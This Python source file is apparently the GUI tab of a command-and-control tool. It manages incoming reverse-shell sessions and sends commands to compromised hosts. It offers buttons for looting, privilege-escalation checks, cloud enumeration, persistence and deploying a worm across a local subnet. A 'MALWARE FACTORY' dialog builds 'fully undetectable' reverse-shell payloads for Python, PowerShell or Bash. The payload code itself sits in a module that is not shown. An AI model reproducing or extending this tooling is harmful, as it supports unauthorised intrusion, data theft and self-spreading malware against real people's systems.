import flet as ft
from gui.theme import *
from core.c2_manager import c2_manager

class C2Tab:
    def __init__(self, page: ft.Page):
        self.page = page
        
        self.c2_display = ft.TextField(
            value="--- C2 TERMINAL READY ---\nWaiting for incoming shell connection...", 
            multiline=True, 
            read_only=True, 
            text_style=ft.TextStyle(font_family="Hacker", color=COLOR_C2_TEXT, size=14), 
            bgcolor=COLOR_C2_BG, 
            border_color=COLOR_BORDER, 
            expand=True
        )
        
        self.c2_input = ft.TextField(
            hint_text="Type command...", 
            text_style=ft.TextStyle(font_family="Hacker", color="white"), 
            bgcolor="#111", 
            border_color=COLOR_BORDER, 
            height=50, 
            on_submit=self.send_c2_command,
            expand=True
        )
        
        self.session_dd = ft.Dropdown(
            width=250, 
            text_size=12,
            label="ACTIVE SESSION",
            label_style=ft.TextStyle(color="#33FF33", font_family="Hacker"),
            border_color="#33FF33",
            text_style=ft.TextStyle(font_family="Hacker", color="white"),
            options=[],
            on_change=self.on_session_change
        )
        
        # Initialize Callback
        # Hook into UI callback to auto-refresh session list and display
        c2_manager.set_ui_callback(self.combined_callback)
        self.refresh_sessions_ui()

    def update_c2_ui(self): 
        self.c2_display.value = c2_manager.output_buffer
        self.page.update()

    def refresh_sessions_ui(self):
        sessions = c2_manager.get_sessions()
        self.session_dd.options = []
        if not sessions:
            self.session_dd.options.append(ft.dropdown.Option("none", "NO ACTIVE SESSIONS"))
            self.session_dd.value = "none"
        else:
            for s in sessions:
                label = f"SESSION {s['id']} | {s['ip']} ({s['os'].upper()})"
                self.session_dd.options.append(ft.dropdown.Option(str(s['index']), label))
            if c2_manager.active_session_index >= 0:
                self.session_dd.value = str(c2_manager.active_session_index)
        self.page.update()

    def combined_callback(self):
        self.refresh_sessions_ui() 
        self.c2_display.value = c2_manager.output_buffer 
        self.page.update()

    def on_session_change(self, e):
        try:
            val = int(self.session_dd.value)
            c2_manager.switch_session(val)
        except: pass

    def send_c2_command(self, e):
        if self.c2_input.value: 
            cmd = self.c2_input.value
            c2_manager.send_command(cmd)
            self.c2_input.value = ""
            self.c2_input.focus()
            self.page.update()

    def show_payload_builder(self, e):
        ip_field = ft.TextField(label="LHOST (IP)", value="192.168.1.100", height=40)
        port_field = ft.TextField(label="LPORT", value="4444", height=40)
        os_dropdown = ft.Dropdown(options=[ft.dropdown.Option("Python"), ft.dropdown.Option("PowerShell"), ft.dropdown.Option("Bash")], value="Python")

        def build_payload(e):
            ip = ip_field.value
            port = port_field.value
            os_type = os_dropdown.value.lower()
            if not ip or not port: return
            
            c2_manager.send_command(f"!generate {os_type} {ip} {port}")
            self.page.close_dialog()

        dlg = ft.AlertDialog(
            title=ft.Text("MALWARE FACTORY", font_family="Hacker", color=COLOR_SEV_CRITICAL),
            content=ft.Column([
                ft.Text("Generate FUD Payload", size=12),
                ip_field, port_field, os_dropdown
            ], height=180, width=300),
            actions=[
                ft.TextButton("CANCEL", on_click=lambda e: self.page.close_dialog()),
                ft.ElevatedButton("GENERATE", bgcolor=COLOR_SEV_CRITICAL, color="white", on_click=build_payload)
            ],
            bgcolor=COLOR_BG_PANEL
        )
        self.page.dialog = dlg
        dlg.open = True
        self.page.update()

    def get_content(self):
        macro_btn_style = ft.ButtonStyle(
            shape=ft.RoundedRectangleBorder(radius=4), 
            color="black", 
            bgcolor=COLOR_ACCENT
        )

        c2_controls = ft.Container(
            width=250,
            bgcolor=COLOR_BG_PANEL,
            border=ft.border.only(left=ft.BorderSide(1, COLOR_BORDER)),
            padding=10,
            content=ft.Column([
                ft.Text("SESSION CONTROL", weight="bold", color="white", size=12, font_family="Hacker"),
                self.session_dd,
                ft.Divider(color=COLOR_BORDER),
                
                ft.Text("QUICK MACROS", weight="bold", color="white", size=12, font_family="Hacker"),
                ft.ElevatedButton("💰 AUTO LOOT", icon=ft.Icons.MONEY, style=macro_btn_style, on_click=lambda e: c2_manager.send_command("!loot"), width=230),
                ft.ElevatedButton("🛡️ PRIVESC CHECK", icon=ft.Icons.SECURITY, style=macro_btn_style, on_click=lambda e: c2_manager.send_command("!privesc"), width=230),
                ft.ElevatedButton("☁️ CLOUD ENUM", icon=ft.Icons.CLOUD, style=macro_btn_style, on_click=lambda e: c2_manager.send_command("!cloud"), width=230),
                ft.Container(height=10),
                
                ft.Text("ADVANCED", weight="bold", color="white", size=12, font_family="Hacker"),
                ft.OutlinedButton("🐍 PERSISTENCE", icon=ft.Icons.ANCHOR, style=ft.ButtonStyle(color="#FF3333"), on_click=lambda e: c2_manager.send_command(f"!persist LHOST 4444"), width=230),
                ft.OutlinedButton("🐛 WORM DEPLOY", icon=ft.Icons.BUG_REPORT, style=ft.ButtonStyle(color="#FF3333"), on_click=lambda e: c2_manager.send_command(f"!worm 192.168.1 LHOST 4444"), width=230),
                
                ft.Container(expand=True),
                ft.ElevatedButton("PAYLOAD BUILDER", icon=ft.Icons.CONSTRUCTION, bgcolor=COLOR_SEV_CRITICAL, color="white", on_click=self.show_payload_builder, width=230)
            ])
        )

        terminal_area = ft.Container(
            expand=True,
            padding=10,
            content=ft.Column([
                ft.Row([
                    ft.Icon(ft.Icons.TERMINAL, color="#33FF33"), 
                    ft.Text("COMMAND CENTER", size=16, weight="bold", color="white", font_family="Hacker"),
                ]),
                ft.Container(
                    content=self.c2_display, 
                    expand=True, 
                    border=ft.border.all(1, "#33FF33"), 
                    border_radius=4,
                    bgcolor="black",
                    padding=10
                ),
                ft.Row([
                    ft.Text("SHELL >", font_family="Hacker", color="#33FF33", weight="bold"), 
                    self.c2_input,
                    ft.IconButton(ft.Icons.SEND, icon_color="#33FF33", on_click=self.send_c2_command)
                ])
            ])
        )

        return ft.Row([
            terminal_area,
            c2_controls
        ], expand=True, spacing=0)
